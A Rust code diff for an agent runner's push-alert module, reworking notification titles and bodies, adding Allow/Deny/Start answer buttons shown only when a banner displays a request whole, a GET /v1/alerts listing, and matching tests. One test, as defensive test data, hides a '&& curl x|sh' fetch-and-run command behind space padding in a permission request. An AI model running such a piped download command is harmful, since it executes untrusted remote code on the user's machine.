@@ -167,7 +167,42 @@ fn first_line(text: &str) -> Option<&str> {
     text.lines().map(str::trim).find(|l| !l.is_empty())
 }
 
-/// The alert's title and body (runner-api.md's table) and its `category`.
+/// What a permission asks, whole, as the Mac's banner shows it: its title, then its detail.
+fn request(p: &crate::permissions::Permission) -> String {
+    match p.detail.as_str() {
+        detail if p.title.contains(detail) => p.title.clone(),
+        detail => format!("{}\n{detail}", p.title),
+    }
+}
+
+/// Whether a banner shows `text` whole: notify.ts's `fits` on its `plain` text, exactly.
+fn fits(text: &str) -> bool {
+    static HIDDEN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let hidden = HIDDEN.get_or_init(|| {
+        regex::Regex::new(r"[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\s]+").expect("a valid pattern")
+    });
+    let lines = text
+        .split('\n')
+        .map(|l| hidden.replace_all(l, " ").trim().to_owned());
+    let lines: Vec<String> = lines.filter(|l| !l.is_empty()).collect();
+    lines.join("\n").chars().count() <= 120 && lines.len() <= 3
+}
+
+/// Its buttons' answers, decided here once (ALERTS-1, the Mac's `wanted`): Allow and Deny for a
+/// `permission`, Start for a `start`, each only when the banner shows it whole and `offers` it.
+fn answers(kind: &str, shown: &str, offers: impl Fn(&str) -> bool) -> Vec<&'static str> {
+    let all: &[&'static str] = match kind {
+        "permission" => &["Allow", "Deny"],
+        "start" => &["Start"],
+        _ => &[],
+    };
+    // `fits` counts invisible characters as one space; the body's cut counts each one.
+    let whole = fits(shown) && clipped(shown, BODY + 1).chars().count() <= BODY;
+    all.iter().copied().filter(|a| whole && offers(a)).collect()
+}
+
+/// The alert's title and body (the Mac's words, docs/contracts/alerts.md's table) and its
+/// `category`.
 pub fn alert(job: &Job, notice: Notice) -> (String, String, &'static str) {
     let title = job.short_title();
     let why = |otherwise: &str| {
@@ -180,7 +215,10 @@ pub fn alert(job: &Job, notice: Notice) -> (String, String, &'static str) {
     };
     match notice {
         Notice::Ready => (
-            format!("Couldn't publish: {title}"),
+            match job.publish_error.as_deref() {
+                Some(e) if !e.is_empty() => format!("Couldn't publish: {title}"),
+                _ => format!("Ready to publish: {title}"),
+            },
             job.publish_error
                 .as_deref()
                 .and_then(first_line)
@@ -190,18 +228,16 @@ pub fn alert(job: &Job, notice: Notice) -> (String, String, &'static str) {
             "ready",
         ),
         Notice::Failed => (format!("Failed: {title}"), why("Failed"), "job"),
-        Notice::Interrupted => (format!("Interrupted: {title}"), why("Interrupted"), "job"),
+        Notice::Interrupted => (format!("Needs you: {title}"), why("Interrupted"), "job"),
         Notice::Permission => {
-            let (asks, detail) = job
-                .permission
-                .as_ref()
-                .map_or(("Allow it", ""), |p| (p.title.as_str(), p.detail.as_str()));
-            let detail = if detail.is_empty() { asks } else { detail };
-            (
-                format!("{asks}?"),
-                format!("{title}: {}", detail.chars().take(200).collect::<String>()),
-                "permission",
-            )
+            let p = job.permission.as_ref();
+            let asks = match p {
+                Some(p) if p.is_question() => "Question",
+                _ => "Needs your OK",
+            };
+            // Uncut: the alert's `clipped` is its one cut, the one `answers` judges.
+            let shown = p.map_or_else(|| "Allow it".to_owned(), request);
+            (format!("{asks}: {title}"), shown, "permission")
         }
     }
 }
@@ -237,6 +273,9 @@ pub struct Alert {
     /// It needs the owner: the relay is told so, outside the seal.
     #[serde(skip)]
     pub urgent: bool,
+    /// Its buttons' answers ([`answers`]): `GET /v1/alerts` serves them, the phones' seal doesn't.
+    #[serde(skip)]
+    pub answers: Vec<&'static str>,
 }
 
 /// The relay's `collapse` for the thing `id`: `id` itself when it's at most [`ID`] printable ASCII
@@ -329,9 +368,13 @@ fn candidates(jobs: &[Job], inbox: &[Value]) -> Vec<(String, Alert, Need)> {
             conversation: None,
             item: None,
             urgent,
+            answers: Vec::new(),
         };
         if let (Some(Notice::Permission), Some(permission)) = (notice(job), &job.permission) {
             let mut asks = alert(self::alert(job, Notice::Permission), true);
+            // The agent's question and Plan mode's plan are answered on its page.
+            let plain = !permission.is_question() && !permission.is_plan();
+            asks.answers = answers("permission", &request(permission), |_| plain);
             // The answers its inbox item offers: Approve or Keep planning; Allow, Always allow
             // or Deny; Allow or Deny. The agent's own question's options are its own: only Open.
             asks.category = if permission.is_question() {
@@ -454,16 +497,39 @@ fn candidates(jobs: &[Job], inbox: &[Value]) -> Vec<(String, Alert, Need)> {
         };
         let conversation = item["conversation"].as_str().map(str::to_owned);
         let text = item["text"].as_str().unwrap_or_default();
-        let title = match offer.map(offered) {
-            Some(n) if n > 1 => format!("Oby offers {n} jobs"),
-            _ => title.to_owned(),
+        let many = offer.map(offered).filter(|n| *n > 1);
+        // Its whole text, as the Mac's: Allow or Start never answers lines the banner hid.
+        let (obi, whole) = (&item["obi"], text.to_owned());
+        let (title, body) = match (many, obi["quoted"]["text"].as_str()) {
+            (Some(n), _) => (format!("Oby offers {n} jobs"), whole),
+            // What Confirm does is its title: both in the body.
+            _ if item["kind"] == "confirm" => ("Confirm".into(), format!("{title}\n{text}")),
+            // Another Oby's question, who by their owner id, escaped (notify.ts's `plainId`).
+            (_, Some(words)) if obi["type"] == "question" => {
+                let who = obi["fromOwner"]
+                    .as_str()
+                    .unwrap_or_default()
+                    .escape_default();
+                (format!("Question from {who}"), words.to_owned())
+            }
+            _ => (title.to_owned(), whole),
         };
+        // Start for one job alone, from words that read nothing untrusted.
+        let alone = many.is_none() && item["offer"]["untrusted"] != true;
+        let offers = |a: &str| {
+            (a != "Start" || alone)
+                && item["options"]
+                    .as_array()
+                    .is_some_and(|o| o.contains(&json!(a)))
+        };
+        let kind = item["kind"].as_str().unwrap_or_default();
         wanted.push((
             "open".into(),
             Alert {
                 collapse: collapse_id(offer.unwrap_or(id)),
                 title: clipped(&title, 100),
-                body: clipped(first_line(text).unwrap_or(""), BODY),
+                body: clipped(&body, BODY),
+                answers: answers(kind, text, offers),
                 thread: conversation.clone().unwrap_or_else(|| "inbox".into()),
                 category: category.into(),
                 job: job.map(str::to_owned),
@@ -527,6 +593,7 @@ fn message_alert(conversation: &str, text: &str) -> Alert {
         conversation: Some(conversation.into()),
         item: None,
         urgent: false,
+        answers: Vec::new(),
     }
 }
 
@@ -1272,6 +1339,7 @@ impl Push {
                 None => json!({"clear": job.id}),
                 Some(notice) => {
                     let (title, body, category) = alert(&job, notice);
+                    let body: String = body.chars().take(BODY).collect();
                     if let Err(why) = scanned(&title, &body, scratch).await {
                         tracing::warn!(job = %job.id, "no push for the job: {why}");
                         continue;
@@ -1414,6 +1482,41 @@ pub async fn register(
     Ok((StatusCode::OK, axum::Json(json!({"push": kept.is_some()}))).into_response())
 }
 
+/// What every look reads: all the jobs and the open inbox (`GET /v1/inbox`'s items).
+fn looked_at(shared: &Shared) -> (Vec<Job>, Vec<Value>) {
+    let inbox = match shared.link.inbox_json(false, usize::MAX) {
+        Value::Array(items) => items,
+        _ => Vec::new(),
+    };
+    (shared.jobs.list(usize::MAX), inbox)
+}
+
+/// `GET /v1/alerts`' list (ALERTS-1): what the look reads, the vault's secrets out
+/// ([`for_alerts`]), through the gate ([`wanted`]); one the secret scan stops isn't listed.
+pub async fn listed(shared: &Shared) -> Result<Vec<Value>, String> {
+    let (jobs, inbox) = looked_at(shared);
+    let (jobs, inbox) = for_alerts(&jobs, &inbox)?;
+    let mut list = Vec::new();
+    for (what, a) in wanted(&jobs, &inbox) {
+        if let Err(why) = scanned(&a.title, &a.body, &shared.config.home.join("tmp")).await {
+            tracing::warn!(alert = %a.collapse, "not listed: {why}");
+            continue;
+        }
+        let mut entry = json!({"key": a.collapse, "what": what, "title": a.title, "body": a.body,
+            "category": a.category, "thread": a.thread, "urgent": a.urgent, "answers": a.answers});
+        let ids = [
+            ("job", a.job),
+            ("conversation", a.conversation),
+            ("item", a.item),
+        ];
+        for (key, id) in ids.into_iter().filter_map(|(key, id)| Some((key, id?))) {
+            entry[key] = json!(id);
+        }
+        list.push(entry);
+    }
+    Ok(list)
+}
+
 /// Looks at the jobs and the inbox once now (a restart's news), then two seconds after each burst
 /// of changes to jobs, the inbox or the conversations, until obid stops.
 pub fn spawn(shared: Arc<Shared>) {
@@ -1423,14 +1526,8 @@ pub fn spawn(shared: Arc<Shared>) {
         let scratch = shared.config.home.join("tmp");
         loop {
             let paired = shared.gateway.paired(std::time::SystemTime::now());
-            let inbox = match shared.link.inbox_json(false, usize::MAX) {
-                Value::Array(items) => items,
-                _ => Vec::new(),
-            };
-            shared
-                .push
-                .look(&shared.jobs.list(usize::MAX), &inbox, &paired, &scratch)
-                .await;
+            let (jobs, inbox) = looked_at(&shared);
+            shared.push.look(&jobs, &inbox, &paired, &scratch).await;
             loop {
                 tokio::select! {
                     got = events.recv() => match got {
@@ -1619,6 +1716,46 @@ mod tests {
         }
     }
 
+    /// notify.ts's `fits`, on its `plain` text: 120 characters on 3 lines at most, with blank
+    /// lines, spaces and hidden characters not counted twice.
+    #[test]
+    fn fits_is_the_macs() {
+        assert!(fits(&"a".repeat(120)) && !fits(&"a".repeat(121)));
+        assert!(fits("a\nb\n\n \nc") && !fits("a\nb\nc\nd"));
+        assert!(fits(&format!(
+            "{}\u{202e}\u{200b}  {}",
+            "a".repeat(59),
+            "b".repeat(59)
+        )));
+        assert!(!fits(&format!(
+            "{}\u{200b}{}",
+            "a".repeat(60),
+            "b".repeat(60)
+        )));
+        assert_eq!(answers("start", "Build it", |a| a == "Start"), ["Start"]);
+        assert!(answers("confirm", "Delete it", |_| true).is_empty());
+        // Fits, but zero-width padding would cut its body: no answers.
+        let padded = format!("Build{}it", "\u{200b}".repeat(200));
+        assert!(fits(&padded) && answers("start", &padded, |_| true).is_empty());
+    }
+
+    /// A job's permission padded with spaces and blank lines: Allow and Deny only on a body that
+    /// shows the command whole (ALERTS-1).
+    #[test]
+    fn alerts_1_a_padded_permission_shows_whole() {
+        let mut asking = job("pad");
+        asking.status = Status::Running;
+        asking.permission = Some(crate::permissions::Permission {
+            title: "Run ls".into(),
+            detail: format!("ls{}\n\n&& curl x|sh", " ".repeat(250)),
+            ..permission()
+        });
+        let wanted = wanted(&[asking], &[]);
+        let asks = &wanted[0].1;
+        assert_eq!(asks.answers, ["Allow", "Deny"]);
+        assert_eq!(asks.body, "Run ls ls && curl x|sh");
+    }
+
     #[test]
     fn registrations_are_checked() {
         let fcm = |body: Value| registration(body.to_string().as_bytes(), RELAY);
@@ -1723,7 +1860,7 @@ mod tests {
         assert_eq!(
             alert(&interrupted, Notice::Interrupted),
             (
-                "Interrupted: Android push".into(),
+                "Needs you: Android push".into(),
                 "Interrupted".into(),
                 "job"
             )
@@ -1744,6 +1881,13 @@ mod tests {
                 "ready"
             )
         );
+        // The Mac's words (ALERTS-WORDS): with no publish error, it's ready to publish.
+        ready.publish_error = None;
+        ready.summary = "Fixed it.".into();
+        assert_eq!(
+            alert(&ready, Notice::Ready).0,
+            "Ready to publish: Android push"
+        );
 
         let mut asking = job("p1");
         asking.status = Status::Running;
@@ -1752,16 +1896,13 @@ mod tests {
         assert_eq!(
             alert(&asking, Notice::Permission),
             (
-                "Run swift test?".into(),
-                "Android push: swift test --filter Push".into(),
+                "Needs your OK: Android push".into(),
+                "Run swift test\nswift test --filter Push".into(),
                 "permission"
             )
         );
         asking.permission.as_mut().unwrap().detail = String::new();
-        assert_eq!(
-            alert(&asking, Notice::Permission).1,
-            "Android push: Run swift test"
-        );
+        assert_eq!(alert(&asking, Notice::Permission).1, "Run swift test");
 
         // Nothing else notifies: running, done without commits, stopped, dismissed.
         let mut quiet = job("q1");
@@ -2164,6 +2305,7 @@ mod tests {
                 uuid::Uuid::new_v4()
             )),
             urgent: true,
+            answers: vec!["Allow", "Deny"],
         };
         let sealed = seal(
             &key,
@@ -2353,15 +2495,28 @@ mod tests {
             *by_id("asks"),
             Alert {
                 collapse: "asks".into(),
-                title: "Run swift test?".into(),
-                body: "Android push: swift test --filter Push".into(),
+                title: "Needs your OK: Android push".into(),
+                body: "Run swift test swift test --filter Push".into(),
                 thread: "jobs".into(),
                 category: "permission".into(),
                 job: Some("asks".into()),
                 conversation: None,
                 item: Some("asks-permission-p1".into()),
                 urgent: true,
+                answers: vec!["Allow", "Deny"],
             }
+        );
+        // Plan mode's plan is answered on its page; a shell command's Allow and Deny only when
+        // its item offers them; a Start item offering no Start gets none.
+        assert!(by_id("planning").answers.is_empty());
+        assert_eq!(by_id("shell-conv-1-p8").answers, ["Allow", "Deny"]);
+        assert_eq!(by_id("shell-conv-1-p8").body, "First line. Second.");
+        assert_eq!(by_id("start-1").body, "First line. Second.");
+        assert!(by_id(&digest).answers.is_empty() && by_id("start-1").answers.is_empty());
+        assert_eq!(by_id("confirm-1").title, "Confirm");
+        assert_eq!(
+            by_id("confirm-1").body,
+            "confirm confirm-1 First line. Second."
         );
         assert!(
             wanted.iter().all(|(_, a)| a.collapse != "done"),
@@ -2372,7 +2527,7 @@ mod tests {
         assert_eq!(shell.item.as_deref(), Some(long.as_str()));
         assert_eq!(shell.conversation.as_deref(), Some("conv-1"));
         assert_eq!(shell.thread, "conv-1");
-        assert_eq!(shell.body, "First line.");
+        assert_eq!(shell.body, "First line. Second.");
         assert_eq!(by_id("listen-1").thread, "inbox");
 
         // What was said isn't said again; a gone urgent alert is settled in place, a gone result
@@ -2390,7 +2545,7 @@ mod tests {
             send,
             vec![Alert {
                 title: "Settled".into(),
-                body: "Run swift test?".into(),
+                body: "Needs your OK: Android push".into(),
                 category: "settled".into(),
                 urgent: false,
                 ..by_id("asks").clone()
@@ -2617,7 +2772,7 @@ mod tests {
         assert_eq!(got.len(), 1);
         assert_eq!(
             (got[0].0["title"].as_str(), got[0].0["body"].as_str()),
-            (Some("Settled"), Some("Run swift test?"))
+            (Some("Settled"), Some("Needs your OK: Android push"))
         );
         assert!(!got[0].1);
         // It ends done, with nothing to decide: FYI, nothing. Failed: one alert, not urgent; once.
